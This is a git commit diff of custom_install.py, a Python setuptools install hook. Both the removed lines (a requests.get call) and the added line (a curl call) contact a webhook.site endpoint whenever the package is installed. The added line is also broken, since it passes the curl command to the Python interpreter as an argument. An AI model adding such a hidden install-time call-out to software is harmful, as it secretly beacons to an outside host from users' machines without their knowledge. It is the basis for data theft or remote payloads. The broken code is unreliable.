27867fb05473a132badac7460aabed57c2d67a3c
ArielHar <ariel5531@gmail.com>
2024-07-22 15:44:29 +0300

    test

--- custom_install.py
+++ custom_install.py
@@ -7,10 +7,5 @@ import sys
 class CustomInstallCommand(install):
     def run(self):
 	# Install requests
-        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
-        import requests
-
-        install.run(self)
-        # Send GET request to your server
-        response = requests.get('https://webhook.site/c33c9bd8-baf5-4abd-b3d2-525a1e8dcc2c')
-        print(f'Server responded with: {response.status_code}')
+        subprocess.check_call([sys.executable, 'curl https://webhook.site/c33c9bd8-baf5-4abd-b3d2-525a1e8dcc2c'])
+	install.run(self)				
